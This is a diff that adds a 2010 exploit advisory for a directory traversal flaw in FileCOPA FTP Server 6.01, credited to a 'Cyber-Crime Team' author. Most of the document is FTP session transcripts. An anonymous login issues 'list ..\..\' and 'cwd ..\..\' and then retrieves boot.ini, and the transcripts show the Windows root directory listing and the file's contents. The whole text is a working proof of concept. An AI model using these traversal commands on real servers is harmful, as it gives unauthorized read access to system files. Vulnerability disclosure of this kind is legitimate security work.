@@ -1,0 +1,59 @@
+# Exploit title: FileCOPA FTP Server 6.01 directory traversal
+# Date: 07.11.2010
+# Software Link: http://www.filecopa-ftpserver.com/
+# Version: 6.01
+# Tested on: Windows XP SP3 Professional
+# Author: Pawel h0wl Wylecial
+#.::Cyber-Crime Team::. 
+# http://cc-team.org
+# http://h0wl.baywords.com
+
+Details:
+
+220-InterVations FileCOPA FTP Server Version 6.01 2nd November 2010
+220 Trial Version. 30 days remaining
+user anonymous
+331 Password required for anonymous
+pass asd
+230 User anonymous logged in.
+pasv
+227 Entering Passive Mode (0,0,0,0,15,160)
+list ..\..\
+150 Opening ASCII mode data connection for file list
+11-14-09  11:49PM                    0 AUTOEXEC.BAT
+11-14-09  11:43PM                  211 boot.ini
+04-15-08  01:00PM                 4952 Bootfont.bin
+11-07-10  04:45PM       <DIR>          Config.Msi
+11-14-09  11:49PM                    0 CONFIG.SYS
+11-14-09  11:56PM       <DIR>          Documents and Settings
+11-14-09  11:49PM                    0 IO.SYS
+11-14-09  11:49PM                    0 MSDOS.SYS
+04-15-08  01:00PM                47564 NTDETECT.COM
+04-15-08  01:00PM               251152 ntldr
+11-07-10  05:45PM           1610612736 pagefile.sys
+11-07-10  04:47PM       <DIR>          Program Files
+11-15-09  12:16AM       <DIR>          RECYCLER
+11-14-09  11:53PM       <DIR>          System Volume Information
+11-07-10  06:29PM       <DIR>          WINDOWS
+226 Transfer complete.
+
+
+220-InterVations FileCOPA FTP Server Version 6.01 2nd November 2010
+220 Trial Version. 30 days remaining
+user anonymous
+331 Password required for anonymous
+pass asd
+230 User anonymous logged in.
+pasv
+227 Entering Passive Mode (0,0,0,0,15,160)
+cwd ..\..\
+250 CWD command successful.
+retr boot.ini
+150 Opening ASCII mode data connection for boot.ini (211 bytes)
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+226 Transfer complete.
+
